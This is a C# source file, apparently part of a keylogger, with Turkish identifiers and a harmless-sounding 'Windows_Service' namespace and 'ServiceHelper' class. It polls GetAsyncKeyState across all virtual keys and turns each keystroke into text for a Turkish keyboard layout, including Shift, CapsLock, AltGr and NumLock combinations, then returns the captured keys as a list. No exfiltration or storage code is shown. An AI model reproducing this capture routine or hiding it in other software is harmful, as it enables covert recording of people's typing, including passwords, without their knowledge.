using System;
using System.Collections.Generic;
using System.Runtime.InteropServices;
using System.Text;
using System.Windows.Forms;

namespace Windows_Service
{
    public class ServiceHelper
    {
        [DllImport("user32.dll")]
        private static extern short GetKeyState(Keys vKey);

        [DllImport("user32.dll")]
        private static extern short GetKeyState(Int32 vKey);
        [DllImport("user32.dll")]
        private static extern short GetAsyncKeyState(Keys Karakter);

        [DllImport("user32.dll")]
        private static extern short GetAsyncKeyState(Int32 karakterDegerleri);

        public static bool ControlKey
        {
            get { return Convert.ToBoolean(GetAsyncKeyState(Keys.ControlKey)); }
        }
        public static bool ControlKeyL
        {
            get { return Convert.ToBoolean(GetAsyncKeyState(Keys.LControlKey)); }
        }
        public static bool ControlKeyR
        {
            get { return Convert.ToBoolean(GetAsyncKeyState(Keys.RControlKey)); }
        }
        public static bool ShiftKey
        {
            get { return Convert.ToBoolean(GetAsyncKeyState(Keys.ShiftKey)); }
        }
        public static bool ShiftKeyL
        {
            get { return Convert.ToBoolean(GetAsyncKeyState(Keys.LShiftKey)); }
        }
        public static bool ShiftKeyR
        {
            get { return Convert.ToBoolean(GetAsyncKeyState(Keys.RShiftKey)); }
        }
        public static bool AltKey
        {
            get { return Convert.ToBoolean(GetAsyncKeyState(Keys.Menu)); }
        }
        public static bool AltKeyL
        {
            get { return Convert.ToBoolean(GetAsyncKeyState(Keys.LMenu)); }
        }
        public static bool AltKeyR
        {
            get { return Convert.ToBoolean(GetAsyncKeyState(Keys.RMenu)); }
        }
        public static bool CapsLock
        {
            get { return Convert.ToBoolean(GetKeyState(Keys.CapsLock)); }
        }
        public static bool NumLock
        {
            get { return Convert.ToBoolean(GetKeyState(Keys.NumLock)); }
        }

        public List<string> basilanTuslar()
        {
            List<string> myKeys = new List<string>();
            for (int i = 0; i <= 255; i++)
            {
                int j = GetAsyncKeyState(i);
                if (j == -32767) 
                {
                    if (i >= 65 && i <= 122) 
                    {
                        if (ShiftKey && CapsLock) 
                        {
                            char karakter = ((char)(i + 32));
                            if (karakter == 'i') 
                                myKeys.Add("ı");
                            else
                                myKeys.Add(karakter.ToString());
                        }
                        else if (ShiftKey)
                            myKeys.Add(((char)(i)).ToString());
                        else if (CapsLock)
                            myKeys.Add(((char)(i)).ToString());
                        else
                        {
                            string karakEkle = "";
                            char karakter = ((char)(i + 32));
                            if (AltKeyR) 
                            {
                                switch (karakter)
                                {
                                    case 'q':
                                    case 'Q':
                                        myKeys.Add("@");
                                        continue;
                                    case 'E':
                                    case 'e':
                                        myKeys.Add("€");
                                        continue;
                                    case 'A':
                                    case 'a':
                                        myKeys.Add("æ");
                                        continue;
                                    case 'ğ':
                                    case 'Ğ':
                                        myKeys.Add("¨");
                                        continue;
                                    case 'ü':
                                    case 'Ü':
                                        myKeys.Add("~");
                                        continue;
                                    default:
                                        break;
                                }
                            }
                            if (AltKeyL && ControlKey) 
                            {
                                switch (karakter)
                                {
                                    case 'q':
                                    case 'Q':
                                        myKeys.Add("@");
                                        continue;
                                    case 'E':
                                    case 'e':
                                        myKeys.Add("€");
                                        continue;
                                    case 'ğ':
                                    case 'Ğ':
                                        myKeys.Add("¨");
                                        continue;
                                    case 'ü':
                                    case 'Ü':
                                        myKeys.Add("~");
                                        continue;
                                    default:
                                        break;
                                }
                            }
                            if (AltKey)
                                continue;
                            if (ControlKey) 
                                karakEkle += "Control + ";
                            if (karakter == 'i') 
                            {
                                karakEkle += "ı";
                                myKeys.Add(karakEkle);
                            }
                            else
                            {
                                if (NumLock) 
                                {
                                    switch (i)
                                    {
                                        case 96:
                                            myKeys.Add("0");
                                            continue;
                                        case 97:
                                            myKeys.Add("1");
                                            continue;
                                        case 98:
                                            myKeys.Add("2");
                                            continue;
                                        case 99:
                                            myKeys.Add("3");
                                            continue;
                                        case 100:
                                            myKeys.Add("4");
                                            continue;
                                        case 101:
                                            myKeys.Add("5");
                                            continue;
                                        case 102:
                                            myKeys.Add("6");
                                            continue;
                                        case 103:
                                            myKeys.Add("7");
                                            continue;
                                        case 104:
                                            myKeys.Add("8");
                                            continue;
                                        case 105:
                                            myKeys.Add("9");
                                            continue;
                                        default:
                                            break;
                                    }
                                }
                                switch (i) 
                                {
                                    case 91:
                                        myKeys.Add("Windows");
                                        continue;
                                    case 93:
                                        myKeys.Add("Menu");
                                        continue;
                                    case 106:
                                        myKeys.Add("*");
                                        continue;
                                    case 107:
                                        myKeys.Add("+");
                                        continue;
                                    case 109:
                                        myKeys.Add("-");
                                        continue;
                                    case 110:
                                        myKeys.Add(",");
                                        continue;
                                    case 111:
                                        myKeys.Add("/");
                                        continue;
                                    case 112:
                                        myKeys.Add("-F1-");
                                        continue;
                                    case 113:
                                        myKeys.Add("-F2-");
                                        continue;
                                    case 114:
                                        myKeys.Add("-F3-");
                                        continue;
                                    case 115:
                                        myKeys.Add("-F4-");
                                        continue;
                                    case 116:
                                        myKeys.Add("-F5-");
                                        continue;
                                    case 117:
                                        myKeys.Add("-F6-");
                                        continue;
                                    case 118:
                                        myKeys.Add("-F7-");
                                        continue;
                                    case 119:
                                        myKeys.Add("-F8-");
                                        continue;
                                    case 120:
                                        myKeys.Add("-F9-");
                                        continue;
                                    case 121:
                                        myKeys.Add("-F10-");
                                        continue;
                                    case 122:
                                        myKeys.Add("-F11-");
                                        continue;
                                    case 123:
                                        myKeys.Add("-F12-");
                                        continue;
                                    default:
                                        break;
                                }
                                karakEkle += karakter.ToString();
                                myKeys.Add(karakEkle);
                            }
                        }
                    }
                    else if (i >= 48 && i <= 57) 
                    {
                        if (ShiftKey && AltKey)
                            continue;
                        else if (ShiftKey)
                        {
                            switch (i)
                            {
                                case 48:
                                    myKeys.Add("=");
                                    continue;
                                case 49:
                                    myKeys.Add("!");
                                    continue;
                                case 50:
                                    myKeys.Add("'");
                                    continue;
                                case 51:
                                    myKeys.Add("^");
                                    continue;
                                case 52:
                                    myKeys.Add("+");
                                    continue;
                                case 53:
                                    myKeys.Add("%");
                                    continue;
                                case 54:
                                    myKeys.Add("&");
                                    continue;
                                case 55:
                                    myKeys.Add("/");
                                    continue;
                                case 56:
                                    myKeys.Add("(");
                                    continue;
                                case 57:
                                    myKeys.Add(")");
                                    continue;
                                default:
                                    break;
                            }
                        }
                        else if (AltKey)
                        {
                            switch (i)
                            {
                                case 48:
                                    myKeys.Add("}");
                                    continue;
                                case 49:
                                    myKeys.Add(">");
                                    continue;
                                case 50:
                                    myKeys.Add("£");
                                    continue;
                                case 51:
                                    myKeys.Add("#");
                                    continue;
                                case 52:
                                    myKeys.Add("$");
                                    continue;
                                case 53:
                                    myKeys.Add("½");
                                    continue;
                                case 54:
                                    myKeys.Add("");
                                    continue;
                                case 55:
                                    myKeys.Add("{");
                                    continue;
                                case 56:
                                    myKeys.Add("[");
                                    continue;
                                case 57:
                                    myKeys.Add("]");
                                    continue;
                                default:
                                    break;
                            }
                        }
                        else
                            switch (i)
                            {
                                case 48:
                                    myKeys.Add("0");
                                    continue;
                                case 49:
                                    myKeys.Add("1");
                                    continue;
                                case 50:
                                    myKeys.Add("2");
                                    continue;
                                case 51:
                                    myKeys.Add("3");
                                    continue;
                                case 52:
                                    myKeys.Add("4");
                                    continue;
                                case 53:
                                    myKeys.Add("5");
                                    continue;
                                case 54:
                                    myKeys.Add("6");
                                    continue;
                                case 55:
                                    myKeys.Add("7");
                                    continue;
                                case 56:
                                    myKeys.Add("8");
                                    continue;
                                case 57:
                                    myKeys.Add("9");
                                    continue;
                                default:
                                    break;
                            }
                    }
                    else
                    {
                        string _getName = Enum.GetName(typeof(Keys), i);
                        switch (_getName)
                        {
                            case "LButton":
                            case "RButton":
                            case "CapsLock":
                            case "ControlKey":
                            case "LControlKey":
                            case "RControlKey":
                            case "ShiftKey":
                            case "LShiftKey":
                            case "RShiftKey":
                            case "RMenu":
                            case "Menu":
                            case "LMenu":
                                continue;
                            case "Space":
                                myKeys.Add(" Space ");
                                continue;
                            case "Enter":
                                myKeys.Add(" Enter ");
                                myKeys.Add(Environment.NewLine);
                                continue;
                            case "OemPeriod": 
                                if (ShiftKey)
                                    myKeys.Add(":");
                                else
                                    myKeys.Add(".");
                                continue;
                            case "OemPipe":
                                if ((ShiftKey && CapsLock) || (ShiftKey == false && CapsLock == false))
                                    myKeys.Add("ç");
                                else
                                    myKeys.Add("Ç");
                                continue;
                            case "OemQuotes":
                                if ((ShiftKey && CapsLock) || (ShiftKey == false && CapsLock == false))
                                    myKeys.Add("i");
                                else
                                    myKeys.Add("İ");
                                continue;
                            case "OemSemicolon":
                                if ((ShiftKey && CapsLock) || (ShiftKey == false && CapsLock == false))
                                    myKeys.Add("ş");
                                else
                                    myKeys.Add("Ş");
                                continue;
                            case "Oem6":
                                if ((ShiftKey && CapsLock) || (ShiftKey == false && CapsLock == false))
                                    myKeys.Add("ü");
                                else
                                    myKeys.Add("Ü");
                                continue;
                            case "Oemcomma":
                                if (AltKey && ShiftKey)
                                    continue;
                                else if (ShiftKey)
                                    myKeys.Add(";");
                                else if (AltKey)
                                    myKeys.Add("`");
                                else
                                    myKeys.Add(",");
                                continue;
                            case "Oem2":
                                if ((ShiftKey && CapsLock) || (ShiftKey == false && CapsLock == false))
                                    myKeys.Add("ö");
                                else
                                    myKeys.Add("Ö");
                                continue;
                            case "OemMinus":
                                if (AltKey && ShiftKey)
                                    continue;
                                else if (ShiftKey)
                                    myKeys.Add("_");
                                else if (AltKey)
                                    myKeys.Add("|");
                                else
                                    myKeys.Add("-");
                                continue;
                            case "Oem8":
                                if (AltKey && ShiftKey)
                                    continue;
                                else if (ShiftKey)
                                    myKeys.Add("?");
                                else if (AltKey)
                                    myKeys.Add("\\");
                                else
                                    myKeys.Add("*");
                                continue;
                            case "Oem102":
                                if (AltKey && ShiftKey)
                                    continue;
                                else if (ShiftKey)
                                    myKeys.Add(">");
                                else if (AltKey)
                                    myKeys.Add("|");
                                else
                                    myKeys.Add("<");
                                continue;
                            case "Prior":
                                myKeys.Add("Page Up");
                                continue;
                            case "Oemtilde":
                                if (AltKey && ShiftKey)
                                    continue;
                                else if (ShiftKey)
                                    myKeys.Add("é");
                                else if (AltKey)
                                    myKeys.Add("<");
                                else
                                    myKeys.Add("\"");
                                continue;
                            default:
                                break;
                        }
                        myKeys.Add(_getName);
                    }
                }
            }
            return myKeys;
        }
    }
}
